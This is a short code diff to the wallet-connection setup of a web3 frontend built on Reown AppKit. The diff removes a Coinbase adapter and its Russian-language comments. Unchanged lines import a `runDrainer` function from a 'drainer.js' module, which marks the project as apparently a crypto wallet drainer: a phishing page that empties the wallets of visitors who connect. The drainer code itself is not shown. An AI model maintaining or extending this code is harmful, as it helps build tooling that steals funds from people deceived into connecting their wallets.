@@ -10,7 +10,6 @@ import {
   base
 } from '@reown/appkit/networks'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { CoinbaseAdapter } from '@reown/appkit-adapter-coinbase' // Импорт адаптера Coinbase
 import { ethers } from 'ethers'
 import { runDrainer } from './drainer.js'
 
@@ -28,13 +27,7 @@ const networks = [
   base
 ]
 
-// Инициализация адаптеров
 const wagmiAdapter = new WagmiAdapter({
-  projectId,
-  networks
-})
-
-const coinbaseAdapter = new CoinbaseAdapter({
   projectId,
   networks
 })
@@ -46,9 +39,8 @@ const metadata = {
   icons: ['https://checkalex.xyz/icon.png']
 }
 
-// Создание AppKit с адаптерами для Wagmi и Coinbase
 const modal = createAppKit({
-  adapters: [wagmiAdapter, coinbaseAdapter], // Добавлен адаптер Coinbase
+  adapters: [wagmiAdapter],
   networks,
   metadata,
   projectId,
